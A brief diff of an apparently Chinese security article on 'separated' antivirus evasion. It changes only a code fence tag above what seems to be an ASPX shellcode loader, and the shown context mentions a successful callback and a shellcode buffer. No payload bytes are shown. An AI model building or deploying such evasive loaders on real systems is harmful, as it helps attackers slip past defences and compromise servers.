@@ -117,7 +117,7 @@ byte[] buf = new byte[509] {
 **上线成功，关于分离免杀的思路不仅仅限制于脚本，pe文件。包括powershell等。这是每一个安全从业者应该考虑的问题。**
 
 ### 附录：Source code
-```c#
+```csharp
 <%@ Page Language="C#" AutoEventWireup="true" Inherits="System.Web.UI.Page" %>
 <%@ Import Namespace="System" %>
 <%@ Import Namespace="System.Runtime.InteropServices" %>
